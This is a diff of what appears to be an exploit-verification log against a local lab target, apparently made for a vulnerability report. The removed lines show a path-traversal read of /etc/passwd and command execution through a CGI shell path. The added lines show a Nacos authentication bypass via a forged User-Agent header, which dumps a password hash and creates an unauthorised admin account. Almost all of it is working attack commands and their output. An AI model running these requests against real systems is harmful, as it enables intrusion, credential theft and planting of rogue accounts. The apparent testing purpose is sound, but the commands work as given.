@@ -1,30 +1,31 @@
-Target: http://127.0.0.1:8080
+Target: http://127.0.0.1:8848
 
 ==============================================================================
-1. Sanity check: GET /
+1. Sanity check: GET /nacos/
 ==============================================================================
 HTTP 200
 
 ==============================================================================
-2. Path traversal: GET /icons/.%2e/../../../../etc/passwd
+2. Baseline: GET /nacos/v1/auth/users without credentials
 ==============================================================================
-curl --path-as-is "http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+HTTP 403
+{"timestamp":"2026-10-19T10:11:31.559+0000","status":403,"error":"Forbidden","message":"unknown user!","path":"/nacos/v
+1/auth/users"}
+
+==============================================================================
+3. Bypass: same request with 'User-Agent: Nacos-Server'
+==============================================================================
+curl -H 'User-Agent: Nacos-Server' "http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9"
 HTTP 200
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sy
-s:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin m
-an:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/
-usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/
-var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/i
-rcd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:
-65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
->>> VULNERABLE: /etc/passwd was disclosed.
+{"totalCount":1,"pageNumber":1,"pagesAvailable":1,"pageItems":[{"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jex
+M34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}]}
+>>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.
 
 ==============================================================================
-3. RCE: POST /cgi-bin/.%2e/../../../../bin/sh
+4. Impact: create an admin account through the same bypass
 ==============================================================================
-curl --path-as-is --data 'echo;id' "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
->>> VULNERABLE: command execution confirmed.
+curl -X POST -H 'User-Agent: Nacos-Server' "http://127.0.0.1:8848/nacos/v1/auth/users?username=pwned412&password=..."
+{"code":200,"message":"create user ok!","data":null}
+>>> VULNERABLE: 'pwned412' was created without any credentials -- log in at http://127.0.0.1:8848/nacos/
 
-Screenshot steps 2 and 3 for the report (vulnerable run).
+Screenshot steps 3 and 4 for the report (vulnerable run).
